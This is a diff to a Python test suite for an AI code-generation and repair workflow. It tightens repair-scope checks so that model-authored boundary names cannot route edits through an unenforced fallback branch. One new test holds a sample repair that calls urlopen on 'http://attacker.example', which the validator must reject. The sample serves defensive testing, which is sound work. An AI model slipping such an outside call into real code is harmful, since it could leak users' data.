@@ -118,6 +118,24 @@ class FakeState:
         self.node = FakeCodeNode(name)
 
 
+def _fake_pipeline_source(result: object) -> str:
+    """Pipeline source whose functions match the call stack FakeResult reports.
+
+    FakeResult claims execution inside ``collect`` and ``rank``. A source with no
+    function definitions makes every repair target unresolvable, which routed the
+    workflow tests through the unenforced module_fallback branch. See issue #3.
+    """
+    return (
+        "import json\n"
+        "def collect():\n"
+        f"    return {result!r}\n"
+        "def rank(value):\n"
+        "    return value\n"
+        "result = rank(collect())\n"
+        "print(json.dumps(result, sort_keys=True))\n"
+    )
+
+
 class FakeResult:
     def __init__(self) -> None:
         self.states: list[FakeState] = [
@@ -1230,6 +1248,34 @@ class CoreTests(unittest.TestCase):
         with self.assertRaises(ValueError):
             validate_repair_scope(original, changed_return, node_target)
 
+    def test_repair_scope_rejects_unresolvable_module_fallback_target(self) -> None:
+        # A declared boundary whose name does not resolve in the source lands in the
+        # module_fallback branch. The authoring model controls boundary names, so that
+        # branch must not become an unrestricted edit path. See issue #3.
+        source = "def gather_sources():\n    return []\n\nrecords = gather_sources()\n"
+        original = GeneratedPipeline(
+            "pipeline.py",
+            [GeneratedFile("pipeline.py", source)],
+            [{"function_name": "collect_sources"}],
+        )
+        target = source_scope(original, function_name="collect_sources", mode="boundary")
+        self.assertEqual(target["scope_kind"], "module_fallback")
+
+        exfiltrating = GeneratedPipeline(
+            "pipeline.py",
+            [
+                GeneratedFile(
+                    "pipeline.py",
+                    "def gather_sources():\n    return []\n\n"
+                    "__import__(\"urllib.request\").urlopen(\"http://attacker.example\")\n"
+                    "records = gather_sources()\n",
+                )
+            ],
+            [{"function_name": "collect_sources"}],
+        )
+        with self.assertRaises(ValueError):
+            validate_repair_scope(original, exfiltrating, target)
+
     def test_repair_target_rotates_to_the_least_repaired_failed_function(self) -> None:
         pipeline = GeneratedPipeline(
             "pipeline.py",
@@ -1558,9 +1604,7 @@ class FakeCodex:
                                     "raise RuntimeError('initial pipeline failed')\n"
                                     if self.fail_first_pipeline and purpose == "market_demand"
                                     else (
-                                        "import json\n"
-                                        f"result = {runtime_result!r}\n"
-                                        "print(json.dumps(result, sort_keys=True))\n"
+                                        _fake_pipeline_source(runtime_result)
                                     )
                                 )
                             ),
@@ -1599,9 +1643,7 @@ class FakeCodex:
                         {
                             "path": "pipeline.py",
                             "content": (
-                                "import json\n"
-                                f"result = {retried_runtime_result!r}\n"
-                                "print(json.dumps(result, sort_keys=True))\n"
+                                _fake_pipeline_source(retried_runtime_result)
                             ),
                         }
                     ],
@@ -1674,9 +1716,7 @@ class FakeCodex:
                         {
                             "path": "pipeline.py",
                             "content": (
-                                "import json\n"
-                                f"result = {repaired_runtime_result!r}\n"
-                                "print(json.dumps(result, sort_keys=True))\n"
+                                _fake_pipeline_source(repaired_runtime_result)
                             ),
                         }
                     ],
@@ -1816,9 +1856,13 @@ class WorkflowTests(unittest.TestCase):
             self.assertTrue(
                 any((run / "parent-run.json").exists() for run in market_demand_runs)
             )
-            self.assertTrue(
-                any((run / "repair-target.json").exists() for run in market_demand_runs)
+            repair_target_run = next(
+                run for run in market_demand_runs if (run / "repair-target.json").exists()
             )
+            repair_target = store.read_json(repair_target_run / "repair-target.json")
+            # The repair must run under real scope enforcement, not the module_fallback
+            # branch that skips it. See issue #3.
+            self.assertEqual(repair_target["scope_kind"], "function")
             self.assertTrue(
                 any((run / "applied-repair.json").exists() for run in market_demand_runs)
             )
